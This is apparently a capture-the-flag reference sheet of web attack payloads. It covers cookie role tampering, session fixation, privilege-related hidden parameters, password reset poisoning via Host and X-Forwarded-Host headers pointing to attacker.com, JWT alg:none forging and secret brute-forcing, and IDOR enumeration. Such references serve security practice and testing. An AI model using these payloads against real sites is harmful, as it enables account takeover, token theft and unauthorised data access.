# CTF-Specific Techniques - Verified

## Cookie Manipulation

### Role Tampering
```
Cookie: role=user → role=admin
Cookie: isAdmin=false → isAdmin=true
Cookie: admin=0 → admin=1
Cookie: access_level=1 → access_level=99
```

### Session Fixation
```
# If app accepts session from URL/cookie:
1. Get session ID: /?session=attacker_session
2. Send to victim: https://target.com/?session=attacker_session
3. Victim logs in → session authenticated
4. Use same session → authenticated
```

## Hidden Parameter Discovery

### Common Hidden Parameters
```
admin, role, debug, test, dev, internal, private
isAdmin, is_admin, isDev, isTest, isDebug
access_level, privilege, permission, scope
token, api_key, secret, key, auth
```

### Discovery Techniques
```
# 1. Check HTML source for hidden fields
<input type="hidden" name="role" value="user">

# 2. Check JavaScript for API calls
fetch('/api/user?admin=true')

# 3. Check cookies for role/permission values
Cookie: role=user

# 4. Try common parameter names in POST body
role=admin&isAdmin=true
```

## Password Reset Poisoning

### Host Header Injection
```
POST /forgot-password HTTP/1.1
Host: attacker.com
username=victim

# Reset email sent to attacker.com with token
```

### X-Forwarded-Host
```
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
username=victim
```

## JWT Quick Attacks

### alg:none
```
Header: {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
Signature: (empty)
Token: header.payload.
```

### Weak Secret
```
# Try common secrets
# secret, password, key, 123456, admin
# Use jwt_tool or hashcat for brute force
```

## IDOR Quick Test

### Numeric ID
```
GET /api/user/1 → GET /api/user/2
GET /api/order/100 → GET /api/order/101
```

### UUID
```
# If UUIDs used, check:
# - API responses that leak other users' UUIDs
# - Referrer headers
# - Predictable patterns (time-based v1 UUIDs)
```
